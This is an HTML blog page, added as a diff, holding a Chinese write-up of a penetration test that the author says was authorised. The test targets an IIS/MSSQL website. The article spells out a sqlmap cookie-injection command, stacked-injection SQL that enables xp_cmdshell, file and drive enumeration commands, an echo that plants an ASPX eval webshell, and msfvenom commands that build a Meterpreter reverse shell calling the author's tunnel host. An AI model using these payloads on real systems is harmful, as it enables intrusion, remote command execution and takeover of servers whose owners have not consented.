@@ -1,0 +1,742 @@
+<html lang="">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="麦当" />
+
+
+
+<meta name="description" content="前言　　最近刚好闲来无事，打开微信接到要一个对网站进行渗透测试的消息，对方发来网站后，马不停蹄的开始。(本次渗透过程均在目标授权下进行，请勿进行非法渗透行为)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一次授权渗透实战">
+<meta property="og:url" content="http://maidang.cool/45983.html">
+<meta property="og:site_name" content="Lion">
+<meta property="og:description" content="前言　　最近刚好闲来无事，打开微信接到要一个对网站进行渗透测试的消息，对方发来网站后，马不停蹄的开始。(本次渗透过程均在目标授权下进行，请勿进行非法渗透行为)">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/12/0WsEgf.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/12/0WRxJJ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0huNAH.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0hdVu4.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0hdGKe.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0hwidA.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/12/0WfkXq.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0fs27Q.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0fy84s.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0fyyCR.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0f6LWR.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0fcJXV.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0fgc2n.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0huvgx.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0hnBmF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0hMmWR.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0hMBm8.th.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/049fD1.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0hJoKs.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0hY5FK.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0htiOs.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/13/0htJk6.th.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/18/0jGZo8.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/18/0jJkp4.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/18/0jYSvd.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/18/0jtNY8.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/18/0jNKA0.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/18/0jUe2D.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/18/0jdk9K.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/18/0jw7WV.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/18/0jB6KS.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/18/0jBOa9.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/19/0vf1sA.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/19/0vIwt0.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/19/0vIgB9.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/19/0vTUJ0.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/19/0v7gBQ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/19/0xZZin.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/19/0xZ2SP.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/19/0xniqO.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/19/0xupkQ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/19/0xuutJ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/19/0xusnf.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/19/0xKoRA.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/19/0xGHfO.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/19/0xJ9tf.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/19/0xJZBn.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/10/19/0xtAwn.jpg">
+<meta property="article:published_time" content="2020-10-12T13:17:17.000Z">
+<meta property="article:modified_time" content="2020-10-12T13:17:17.000Z">
+<meta property="article:author" content="麦当">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/10/12/0WsEgf.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Lion" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/orange/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>一次授权渗透实战 | Lion</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="https://s1.ax1x.com/2020/04/18/JmkHGq.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">麦当</a></h1>
+        </hgroup>
+
+        
+            <!--   原个性签名    -->
+        <!-- <p class="header-subtitle">人生若只如初见,何事秋风悲画扇</p>-->
+
+            <div style="margin: 0 auto;text-align: left;font-size: 16px;color: #444;font-family: 宋体;font-weight: bold;">
+                <span id="hitokoto">获取中...</span>
+                <p style="text-align: right">
+                    <span>——</span>
+                    <span id="from"></span>
+                </p>
+            </div>
+
+            <script>
+                var xhr = new XMLHttpRequest();
+                xhr.open('get', 'https://v1.hitokoto.cn/?c=b&c=a&c=d&length=12');
+                xhr.onreadystatechange = function () {
+                    if (xhr.readyState === 4) {
+                        var data = JSON.parse(xhr.responseText);//获得字符串形式的响应数据。
+                        var hitokoto = document.getElementById('hitokoto');
+                        var fromm=document.getElementById("from")
+                        fromm.innerText=data.from;
+                        hitokoto.innerText = data.hitokoto;
+                    }
+                }
+                xhr.send();
+            </script>
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>个性签名</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Github" href="https://github.com/SnowMeteors" target="_blank" rel="noopener" title="Github"></a>
+                            
+                                <a class="fa 牛客网" href="https://www.nowcoder.com/profile/5746494" target="_blank" rel="noopener" title="牛客网"></a>
+                            
+                                <a class="fa 秒速五厘米" href="https://music.163.com/#/album?id=49790" target="_blank" rel="noopener" title="秒速五厘米"></a>
+                            
+                                <a class="fa bilibili" href="https://space.bilibili.com/381708330" target="_blank" rel="noopener" title="bilibili"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA/" rel="tag">DVWA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KuWo/" rel="tag">KuWo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/burpsuite/" rel="tag">burpsuite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows%E6%8F%90%E6%9D%83/" rel="tag">windows提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%93%BE%E8%A1%A8/" rel="tag">链表</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9F%B3%E4%B9%90%E5%A4%96%E9%93%BE/" rel="tag">音乐外链</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://www.tianchenyi.com/" target="_blank" rel="noopener">小琲的天尘翼</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">每一刻都是崭新的</div>
+                </section>
+                
+            </div>
+        </div>
+
+        <!-- 底部一言 -->
+        <!--<p id="hitokoto">获取中...</p>-->
+        <!--<div style="border: 1px solid black;margin: 0 auto;text-align: left;font-size: medium">
+            <span id="hitokoto">获取中...</span>
+            <p style="text-align: right">
+                <span>——</span>
+                <span id="from"></span>
+            </p>
+        </div>
+
+        <script>
+            var xhr = new XMLHttpRequest();
+            xhr.open('get', 'https://v1.hitokoto.cn/?c=b');
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4) {
+                    var data = JSON.parse(xhr.responseText);//获得字符串形式的响应数据。
+                    var hitokoto = document.getElementById('hitokoto');
+                    var fromm=document.getElementById("from")
+                    fromm.innerText=data.from;
+                    hitokoto.innerText = data.hitokoto;
+                }
+            }
+            xhr.send();
+        </script>-->
+        <!-- 一言 -->
+
+    </header>                
+</div>
+    </div>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/bubbly-bg@1.0.0/dist/bubbly-bg.js"></script>
+
+
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">麦当</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="https://s1.ax1x.com/2020/04/18/JmkHGq.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">麦当</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">人生若只如初见,何事秋风悲画扇</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Github" target="_blank" href="https://github.com/SnowMeteors" title="Github"></a>
+                            
+                                <a class="fa 牛客网" target="_blank" href="https://www.nowcoder.com/profile/5746494" title="牛客网"></a>
+                            
+                                <a class="fa 秒速五厘米" target="_blank" href="https://music.163.com/#/album?id=49790" title="秒速五厘米"></a>
+                            
+                                <a class="fa bilibili" target="_blank" href="https://space.bilibili.com/381708330" title="bilibili"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="个性签名"/>
+</nav>
+      <div class="body-wrap">
+        <article id="post-一次授权渗透实战" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/45983.html" class="article-date">
+      <time datetime="2020-10-12T13:17:17.000Z" itemprop="datePublished">2020-10-12</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      一次授权渗透实战
+    </h1>
+  
+
+        
+            <div>
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">2.3k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">8分</span>
+      </span>
+    </span>
+</div>
+
+
+        
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+    </div>
+
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>　　最近刚好闲来无事，打开微信接到要一个对网站进行渗透测试的消息，对方发来网站后，马不停蹄的开始。<b>(本次渗透过程均在目标授权下进行，请勿进行非法渗透行为)</b><br>　　<a id="more"></a></p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>　　打开网站，一股简陋破败风引面而来，随即注册一个账号，以便后面的登录<br>　　<img src="https://s1.ax1x.com/2020/10/12/0WsEgf.png"><br>　　利用wappalyzer浏览器插件，获取到的信息，对于我这个菜鸡而言，并没有看到可以有用的东西<br>　　<img src="https://s1.ax1x.com/2020/10/12/0WRxJJ.png"><br>　　得到waf为OWASP CRS<br>　　<img src="https://s1.ax1x.com/2020/10/13/0huNAH.png"><br>　　使用nmap扫描，nmap -O -v -Pn 61.157.xx.xx<br>　　<img src="https://s1.ax1x.com/2020/10/13/0hdVu4.png"><br>　　开放的端口少之又少，基本没啥可利用的。又结合web服务器是iis，再根据nmap猜测的操作系统，确定操作系统为win server 2012<br>　　再用nmap自带的漏洞利用脚本，nmap –script=vuln 61.157.xx.xx<br>　　<img src="https://s1.ax1x.com/2020/10/13/0hdGKe.png"><br>　　主机安全做的很好，数据库禁止外连，让我无从下手，只有换一条路<br>　　<img src="https://s1.ax1x.com/2020/10/13/0hwidA.jpg"><br>　　直接上御剑后，看到admin字符，让我心中小喜，果断打开<br>　　<img src="https://s1.ax1x.com/2020/10/12/0WfkXq.png"><br>　　尝试弱口令登陆<br>　　<img src="https://s1.ax1x.com/2020/10/13/0fs27Q.png"><br>　　神奇的一幕出现了，竟然验证码有误?<br>　　<img src="https://s1.ax1x.com/2020/10/13/0fy84s.png"><br>　　后来不管我怎么输入，都只会出现一个提示”验证码有误!”，看来对方的设计是大家来一个同归于尽，这条路只好放弃了<br>　　<img src="https://s1.ax1x.com/2020/10/13/0fyyCR.jpg">
+　　</p>
+<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>　　登陆进去后，发现有上传头像的地方，果断试试能不能上传马<br>　　尝试content-type能否绕过<br>　　<img src="https://s1.ax1x.com/2020/10/13/0f6LWR.png"><br>　　看来对方是要校验后缀名，而且还是白名单的形式，看是否有iis解析漏洞，期间我搜了许多都没有找到iis8.5漏洞文章<br>　　<img src="https://s1.ax1x.com/2020/10/13/0fcJXV.png"><br>　　上传一次正常图片后，虽然给出图片路径，但文件名是根据时间戳命名的图片，并且统一后缀名为png，这种看到就换条路吧<br>　　<img src="https://s1.ax1x.com/2020/10/13/0fgc2n.png"><br>　　看到重置登陆密码，我就猜想这个框是否存在sql注入呢<br>　　<img src="https://s1.ax1x.com/2020/10/13/0huvgx.png"><br>　　<img src="https://s1.ax1x.com/2020/10/13/0hnBmF.png"><br>　　难道就这样放弃了吗，我停下手中的键盘想了想。无论我怎么修改密码字符，都提示密码错误，那么肯定是将cookie中(shouji)参数代入sql语句，然后在将密码参数代入，看两个参数是否同时匹配数据库。也就是说shouji参数也可能存在sql注入<br>　　<img src="https://s1.ax1x.com/2020/10/13/0hMmWR.png"><br>　　这都不拦截？形同虚设的waf<br>　　<br>　　<img src="https://s1.ax1x.com/2020/10/13/0hMBm8.th.jpg"><br>　　<br>　　直接上sqlmap，以前从来没有碰到过注入点在cookie里面的，所以sqlmap命令格式就卡了我一天。顺便总结一下如果注入点在cookie，并且网站需要登录的命令。<br>　　带上–cookie参数，作用是让sqlmap能登陆进网站，重点来了，必须使用–level 2 后面的数字必须是&gt;=2，它才会检测cookie是否存在注入点<br>　　参考命令如下</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://xxxx/tedb/user_repwd.aspx"</span> <span class="params">--level</span> 2 <span class="params">--cookie=</span><span class="string">"member=id=45230&amp;shouji=123456"</span> -p member <span class="params">--random-agent</span></span><br></pre></td></tr></table></figure>
+<p>　　添加–os-shell参数，看能否直接得到shell<br>　　<img src="https://s1.ax1x.com/2020/10/13/049fD1.png"><br>　　报错信息意思是不支持堆叠注入，这里有<b>疑惑点</b>后面讲<br>　　获取banner信息为Microsoft SQL Server 2008，操作系统win server 2012 or 2008，根据前面的信息 100%确定操作系统为win server 2012<br>　　<img src="https://s1.ax1x.com/2020/10/13/0hJoKs.png"><br>　　获取数据库<br>　　<img src="https://s1.ax1x.com/2020/10/13/0hY5FK.png"><br>　　获取msdb数据库中的表，出现了这一幕<br>　　<img src="https://s1.ax1x.com/2020/10/13/0htiOs.png"><br>　　<img src="https://s1.ax1x.com/2020/10/13/0htJk6.th.jpg" ><br>　　此时天色已晚，躺在床上的我，整理一下思路。首先能获取到数据库信息，那么肯定存在sql注入的，其次是mssql数据库，是不是还有其他办法得到webshell呢？于是打开手机疯狂百度，学习其他大佬的姿势，找到了可以用xp_cmdshell 来让对方服务器远程执行cmd命令。学到了，明天起来验证，睡觉狗命要紧!!!</p>
+<h3 id="利用xp-cmdshell拿到webshell"><a href="#利用xp-cmdshell拿到webshell" class="headerlink" title="利用xp_cmdshell拿到webshell"></a>利用xp_cmdshell拿到webshell</h3><p>　　MSSQL2005及以上版本默认禁用了xp_cmdshell。而如果该扩展存储过程没被删除，就能一句话启用它(不支持多句执行的话，请单独执行每句)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--开启</span></span><br><span class="line">EXEC sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">', 1;RECONFIGURE;EXEC sp_configure '</span>xp_cmdshell<span class="string">', 1;RECONFIGURE</span></span><br><span class="line"><span class="string">--关闭</span></span><br><span class="line"><span class="string">EXEC sp_configure '</span><span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">', 1;RECONFIGURE;EXEC sp_configure '</span>xp_cmdshell<span class="string">', 0;RECONFIGURE</span></span><br></pre></td></tr></table></figure>
+<p>　　<img src="https://s1.ax1x.com/2020/10/18/0jGZo8.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &quot;whoami&quot; --用来执行cmd命令</span><br></pre></td></tr></table></figure>
+
+<p>　　<img src="https://s1.ax1x.com/2020/10/18/0jJkp4.png"><br>　　能远程执行命令，很nice，果断开启<br>　　<img src="https://s1.ax1x.com/2020/10/18/0jYSvd.png"><br>　　因图片看不清有些标点符号，贴出完整语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shouji=123456';EXEC sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">',1;RECONFIGURE;EXEC sp_configure '</span>xp_cmdshell<span class="string">',1;RECONFIGURE--</span></span><br></pre></td></tr></table></figure>
+<p>　　可以从图片清楚的看到出现了红色和黑色两部分，这说明黑色部分的语句并没有发送过去，只有红色的部分发送过去了，这也是burp很强大的功能。<br>　　将 ‘;’ url编码成 %3b，其他发送失败的字符也同理(还记得前面写的不支持堆叠注入吗，原因就在于sqlmap中的payload没有将’;’转换成%3b，所以会出现不支持堆叠注入，自己编写一个sqlmap的tamper脚本即可<a href="https://blog.csdn.net/whatday/article/details/62059263" target="_blank" rel="noopener">sqlmap tamper脚本编写</a>)<br>　　<img src="https://s1.ax1x.com/2020/10/18/0jtNY8.png"><br>　　执行后，是无法得知对方是否成功开启了xp_cmdshell，所以可以用ping命令返回时间，来判断<br>　　发送后，大约等了10s左右，得到了响应包，说明开启成功<br>　　<img src="https://s1.ax1x.com/2020/10/18/0jNKA0.png"><br>　　先查看一下是什么权限吧<br>　　<img src="https://s1.ax1x.com/2020/10/18/0jUe2D.png"><br>　　<img src="https://s1.ax1x.com/2020/10/18/0jdk9K.png"><br>　　竟然无回显，查阅后得知，可以将结果写入表中，然后查看表中的内容即可</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">TABLE</span> D99_CMD; <span class="keyword">create</span> <span class="keyword">TABLE</span> D99_CMD([<span class="keyword">Data</span>][<span class="built_in">varchar</span>](<span class="number">1000</span>),<span class="keyword">ID</span> <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">IDENTITY</span> (<span class="number">1</span>,<span class="number">1</span>));<span class="keyword">insert</span> D99_CMD exec master.dbo.xp_cmdshell <span class="string">'whoami'</span> ;</span><br></pre></td></tr></table></figure>
+<p>　　将执行的结果写进D99_CMD表<br>　　<img src="https://s1.ax1x.com/2020/10/18/0jw7WV.png"><br>　　改变id=1后面的数字即可查看表中对应的行的内容，只能一行一行的查看，这也是非常鸡肋的地方</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查看表中的内容</span></span><br><span class="line">And (<span class="keyword">select</span> Top <span class="number">1</span> <span class="built_in">char</span>(<span class="number">124</span>)+<span class="keyword">data</span>+<span class="built_in">char</span>(<span class="number">124</span>) <span class="keyword">From</span> (<span class="keyword">select</span> Top <span class="number">1</span> [<span class="keyword">ID</span>],[<span class="keyword">Data</span>] <span class="keyword">From</span> D99_CMD <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">Order</span> <span class="keyword">by</span> [<span class="keyword">ID</span>]) T <span class="keyword">Order</span> <span class="keyword">by</span> [<span class="keyword">ID</span>] <span class="keyword">desc</span>)&gt;<span class="number">0</span></span><br><span class="line"><span class="comment">-- 获取表有多少行</span></span><br><span class="line"><span class="keyword">And</span> (<span class="keyword">select</span> <span class="built_in">char</span>(<span class="number">124</span>)%<span class="number">2</span>Bcast(<span class="keyword">Count</span>(<span class="number">1</span>) <span class="keyword">as</span> <span class="built_in">varchar</span>(<span class="number">8000</span>))%<span class="number">2</span>Bchar(<span class="number">124</span>) <span class="keyword">From</span> D99 _CMD)&gt;<span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p>　　<img src="https://s1.ax1x.com/2020/10/18/0jB6KS.png"><br>　　<img src="https://s1.ax1x.com/2020/10/18/0jBOa9.png"><br>　　注意这里的system权限，是对方cmd.exe拥有的system权限，即本地cmd执行whoami，返回的内容<br>　　查看对方有哪些盘</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> %i <span class="keyword">in</span> (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) <span class="keyword">do</span> @<span class="keyword">if</span> exist %i: echo %i:</span><br></pre></td></tr></table></figure>
+<p>　　执行命令后，查看表中的内容，如果出现”此时不应有 i。”，将payload进行url编码，重新发送后即可<br>　　<img src="https://s1.ax1x.com/2020/10/19/0vf1sA.png"><br>　　获取到对方有c,d盘<br>　　<img src="https://s1.ax1x.com/2020/10/19/0vIwt0.png"><br>　　接下来，就要获取网站的物理路径<br>　　<img src="https://s1.ax1x.com/2020/10/19/0vIgB9.png"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在c盘下查找user_repwd.aspx文件的物理路径 注意文件名后面一定要有'*'号</span></span><br><span class="line"><span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (user_repwd*.aspx) <span class="keyword">do</span> @echo %i</span><br></pre></td></tr></table></figure>
+<p>　　当我查看表中的内容时，无任何回显于是，在d盘下搜索，得到<br>　　<img src="https://s1.ax1x.com/2020/10/19/0vTUJ0.png"><br>　　其实在我最开始的时候，我没有先执行获取对方有哪些盘符的命令，而是先执行c盘下获取文件路径命令。当输出表结果是无任何回显时，我是非常懵逼的，我一度怀疑命令是不是执行失败，而没有第一次时间考虑到对方有多个盘符，导致我在这里浪费了几个小时。。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将一句话木马写入文件</span></span><br><span class="line">echo ^&lt;%<span class="selector-tag">@</span> Page Language=<span class="string">"Jscript"</span>%^&gt;^&lt;%eval(Request.Item[<span class="string">"pass"</span>],<span class="string">"unsafe"</span>);%^&gt; &gt; d:\wwwroot\sjk\tedb\shell.aspx</span><br></pre></td></tr></table></figure>
+<p>　　使用蚁剑成功连接上webshell<br>　　<img src="https://s1.ax1x.com/2020/10/19/0v7gBQ.png"><br>　　执行whoami后发现是iis apppool\xxx<br>　　发现拥有的权限有，可遍历文件夹包括c盘，文件读写，当前文件夹下不能上传文件<br>　　很幸运的是，我发现在其他文件夹下能成功上传文件，接下来提权</p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权　　"></a>提权　　</h3><p>　　这里我用花生壳来建立tcp隧道<br>　　打开kali，查看ip地址<br>　　<img src="https://s1.ax1x.com/2020/10/19/0xZZin.png"><br>　　点击花生壳最右下角的’+’号，创建场景，应用名称随便填，内网主机填kali的ip地址，内网端口随便填，我这里填8080，保存<br>　　<img src="https://s1.ax1x.com/2020/10/19/0xZ2SP.png"><br>　　生成反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp  LHOST=外网域名 LPORT=外网端口 -f exe -o install.exe</span><br></pre></td></tr></table></figure>
+<p>　　<img src="https://s1.ax1x.com/2020/10/19/0xniqO.png"></p>
+<p>以我的为例，生成反弹shell参考命令如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp  LHOST=l347x45481.qicp.vip LPORT=57945 -f exe -o install.exe</span><br></pre></td></tr></table></figure>
+
